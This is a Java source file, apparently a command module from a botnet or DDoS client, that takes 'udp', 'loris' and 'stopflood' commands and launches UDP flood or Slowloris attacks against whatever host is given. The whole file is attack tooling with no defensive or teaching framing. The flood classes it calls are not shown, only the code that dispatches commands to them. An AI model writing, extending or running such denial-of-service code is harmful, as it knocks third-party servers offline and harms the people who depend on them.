package syn.modules;

import syn.main.Client;
import syn.net.Flood;
import syn.net.LorisFlood;
import syn.net.UDPFlood;
import syn.utils.Utilities;

public class FloodModule extends Module {

	public FloodModule() {
		super("udp loris stopflood");
	}
	
	public void process() {
		Utilities uc = Client.getInstance().uc;
		
		String[] split = preCmd.split(":");
		if(cmd.equals("udp")) {
			try {
				String details = uc.getCmdTxt(split);
				String[] hsplit = details.split(" ");
				String host = hsplit[0];
				uc.write("UDP packets targeted at " + host + ".");
				Flood.startFlood(new UDPFlood(host));
			
			} catch (Exception udpError) { uc.write("Incorrect UDP cmd usage. @udp <ip>"); }
		
		} else if(cmd.equals("loris")) {
			try {
				String details = uc.getCmdTxt(split);
				String[] hsplit = details.split(" ");
				String host = hsplit[0];
				uc.write("Loris targeted at " + host + ".");
				Flood.startFlood(new LorisFlood(host));
			} catch (Exception httpError) { uc.write("Incorrect Loris cmd usage: "); httpError.printStackTrace(); }
			
		} else if(cmd.equals("stopflood")) {
			uc.write("Stopping flood.");
			Flood.stopFlood();
		}
	}	
}